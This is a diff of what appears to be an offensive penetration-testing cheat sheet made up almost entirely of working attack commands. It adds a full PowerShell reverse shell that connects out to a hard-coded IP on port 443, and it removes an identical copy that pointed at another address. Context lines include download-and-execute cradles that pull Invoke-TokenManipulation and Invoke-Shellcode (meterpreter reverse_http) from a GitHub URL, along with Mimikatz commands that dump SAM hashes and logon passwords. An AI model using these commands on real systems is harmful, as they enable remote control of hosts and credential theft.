@@ -1,5 +1,7 @@
 -------------------------------------------------------------------------------------------------------------------------------------
 
+powershell -noexit -ExecutionPolicy Unrestricted "$client = New-Object System.Net.Sockets.TCPClient('10.10.101.220',443);$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length)}"
+
 powershell "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/analyticsearch/commercial/master/Invoke-TokenManipulation.ps1') ; Invoke-TokenManipulation -CreateProcess 'cmd.exe' -Username 'nt authority\system'"
 
 powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/analyticsearch/commercial/master/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_http -Lhost <IP> -Lport 443 -Force"
@@ -58,9 +60,5 @@ privilege::debug
 token::elevate
 lsadump::sam
 sekurlsa::logonpasswords
-
--------------------------------------------------------------------------------------------------------------------------------------
-
-powershell -noexit -ExecutionPolicy Unrestricted "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.2',443);$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length)}"
 
 -------------------------------------------------------------------------------------------------------------------------------------
